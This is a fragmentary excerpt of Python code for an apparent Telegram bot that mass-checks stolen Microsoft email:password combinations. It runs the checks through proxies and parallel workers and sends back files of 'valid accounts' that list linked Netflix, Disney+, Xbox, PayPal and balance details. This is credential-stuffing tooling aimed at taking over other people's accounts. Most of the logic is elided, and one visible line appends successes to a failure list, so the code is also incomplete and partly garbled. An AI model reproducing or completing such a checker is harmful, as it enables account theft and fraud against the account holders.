...
async def process_microsoft_accounts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    proxies = [MS_GLOBAL_SETTINGS['proxy']] if MS_GLOBAL_SETTINGS['proxy'] else None
    workers = MS_GLOBAL_SETTINGS['workers']
    ...
    try:
        ...
        for idx, account in enumerate(accounts, 1):
            try:
                ...
                if result.status == "SUCCESS":
                    ...
                    fails.append(f"{result.status}:{email}:{password}")
        ...
        if hits:
            ...
            await update.message.reply_document(
                ...
                filename=f"hits_{user_id}.txt",
                caption="✅ VALID ACCOUNTS (Simple)"
            )
            
            hits_detailed_txt = '\n'.join(hits_detailed)
            await update.message.reply_document(
                document=hits_detailed_txt.encode(),
                filename=f"hits_detailed_{user_id}.txt",
                caption="✅ VALID ACCOUNTS (Full Info: Netflix, Disney+, Xbox, PayPal, Supercell, Balance)"
            )
...
def main():
    ...
    application.add_handler(CommandHandler("mms", check_microsoft_mass))
